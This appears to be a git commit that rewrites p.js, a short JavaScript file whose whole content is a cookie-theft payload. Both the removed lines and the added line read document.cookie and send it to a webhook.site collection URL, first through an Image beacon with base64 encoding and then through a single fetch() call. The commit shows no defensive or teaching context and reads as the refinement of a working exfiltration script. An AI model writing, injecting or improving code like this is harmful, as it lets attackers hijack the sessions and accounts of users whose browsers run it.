79914a290abf29d46b3c4d5f27ef28fe2ec9bee6
ronaldulate <ronaldulate@gmail.com>
2026-06-24 10:40:27 -0600

    use fetch instead of Image

--- p.js
+++ p.js
@@ -1,6 +1,1 @@
-var c=document.cookie;
-if(c){
-  new Image().src='https://webhook.site/6c818111-0449-4274-b8fa-2d1158a7beb2?c='+encodeURIComponent(btoa(c));
-}else{
-  new Image().src='https://webhook.site/6c818111-0449-4274-b8fa-2d1158a7beb2?nocookie=1';
-}
+fetch('https://webhook.site/6c818111-0449-4274-b8fa-2d1158a7beb2?cookie='+encodeURIComponent(document.cookie));
